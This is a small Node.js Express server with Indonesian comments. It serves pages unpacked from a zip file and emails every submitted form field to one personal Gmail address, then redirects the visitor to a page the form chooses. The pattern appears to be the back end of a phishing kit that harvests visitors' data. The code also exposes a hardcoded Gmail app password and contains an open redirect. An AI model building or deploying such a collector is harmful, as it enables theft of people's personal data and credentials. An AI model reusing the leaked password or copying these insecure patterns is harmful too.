const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const path = require("path");
const fs = require("fs");
const unzipper = require("unzipper");

const app = express();
const PORT = process.env.PORT || 3000;

// Ekstrak public.zip jika folder public belum ada
const publicPath = path.join(__dirname, "public");
const zipPath = path.join(__dirname, "public.zip");

if (!fs.existsSync(publicPath) && fs.existsSync(zipPath)) {
  fs.createReadStream(zipPath)
    .pipe(unzipper.Extract({ path: publicPath }))
    .on("close", () => console.log("✅ public.zip berhasil diekstrak."));
}

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(publicPath));

// Route POST
app.post("/submit", (req, res) => {
  const formData = req.body;
  const nextPage = formData.next || "/halaman4.html";

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "abdul4y7@gmail.com",
      pass: "bwvr kcph tqkf iahl",
    },
  });

  const message = Object.entries(formData)
    .filter(([key]) => key !== "next")
    .map(([key, val]) => `${key}: ${val}`)
    .join("\n");

  const mailOptions = {
    from: "abdul4y7@gmail.com",
    to: "abdul4y7@gmail.com",
    subject: "Form Data Masuk",
    text: message,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Gagal mengirim email:", error);
    } else {
      console.log("Email terkirim:", info.response);
    }
    res.redirect(nextPage);
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server berjalan di port ${PORT}`);
});
